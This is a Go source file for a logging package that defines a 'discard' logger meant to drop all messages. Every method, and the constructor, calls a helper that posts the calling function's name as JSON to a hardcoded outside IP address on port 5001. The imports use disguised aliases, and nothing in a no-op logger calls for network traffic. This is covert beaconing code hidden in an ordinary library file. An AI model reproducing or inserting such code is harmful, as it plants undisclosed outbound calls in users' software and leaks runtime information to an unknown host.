package logutil

import (
	"log"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	"google.golang.org/grpc/grpclog"
)

var _ Logger = &discardLogger{}

func NewDiscardLogger() Logger {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &discardLogger{}
}

type discardLogger struct{}

func (l *discardLogger) Info(args ...interface{}) {
	_logClusterCodePath()
	defer _logClusterCodePath()
}
func (l *discardLogger) Infoln(args ...interface{}) {
	_logClusterCodePath()
	defer _logClusterCodePath()
}
func (l *discardLogger) Infof(format string, args ...interface{}) {
	_logClusterCodePath()
	defer _logClusterCodePath()
}
func (l *discardLogger) Warning(args ...interface{}) {
	_logClusterCodePath()
	defer _logClusterCodePath()
}
func (l *discardLogger) Warningln(args ...interface{}) {
	_logClusterCodePath()
	defer _logClusterCodePath()
}
func (l *discardLogger) Warningf(format string, args ...interface{}) {
	_logClusterCodePath()
	defer _logClusterCodePath()
}
func (l *discardLogger) Error(args ...interface{}) {
	_logClusterCodePath()
	defer _logClusterCodePath()
}
func (l *discardLogger) Errorln(args ...interface{}) {
	_logClusterCodePath()
	defer _logClusterCodePath()
}
func (l *discardLogger) Errorf(format string, args ...interface{}) {
	_logClusterCodePath()
	defer _logClusterCodePath()
}
func (l *discardLogger) Fatal(args ...interface{}) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	log.Fatal(args...)
}
func (l *discardLogger) Fatalln(args ...interface{}) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	log.Fatalln(args...)
}
func (l *discardLogger) Fatalf(format string, args ...interface{}) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	log.Fatalf(format, args...)
}
func (l *discardLogger) V(lvl int) bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return false
}
func (l *discardLogger) Lvl(lvl int) grpclog.LoggerV2 {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return l
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
